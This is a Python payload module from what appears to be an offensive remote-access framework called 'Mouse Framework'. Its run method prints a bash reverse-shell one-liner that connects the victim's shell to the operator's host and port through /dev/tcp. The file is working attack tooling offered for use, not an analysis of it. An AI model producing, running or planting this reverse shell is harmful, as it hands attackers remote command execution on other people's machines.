#!/usr/bin/env python

#            ---------------------------------------------------
#                              Mouse Framework
#            ---------------------------------------------------
#                Copyright (C) <2019-2020>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

from core import helper as h
class payload:
    def __init__(self):
        self.name = "Bourne-Again Shell"
        self.description = "Creates a bash payload."
        self.usage = "Run in terminal."

    def run(self,server):
        print(h.WHITE + "-"*40 + h.ENDC)
        print(h.COLOR_INFO+"bash &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"+h.ENDC)
        print(h.WHITE + "-"*40 + h.ENDC)
